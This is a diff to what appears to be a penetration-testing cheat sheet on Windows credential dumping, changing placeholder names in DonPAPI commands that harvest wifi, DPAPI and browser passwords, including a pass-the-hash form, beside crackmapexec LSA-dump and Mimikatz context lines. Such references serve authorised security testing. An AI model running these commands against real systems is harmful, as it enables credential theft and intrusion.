@@ -51,11 +51,11 @@ crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
 ### DonPAPI
 Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
 ```bash
-python3 DonPAPI.py domain/user:password@target
+python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
 ```
 It's possible to use the tool with Pass-The-Hash :
 ```bash
-python3 DonPAPI.py domain/user@target --hashes LM:NT
+python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
 ```
 ### Mimikatz
 On Windows, retrieve password/hash from a dump file :
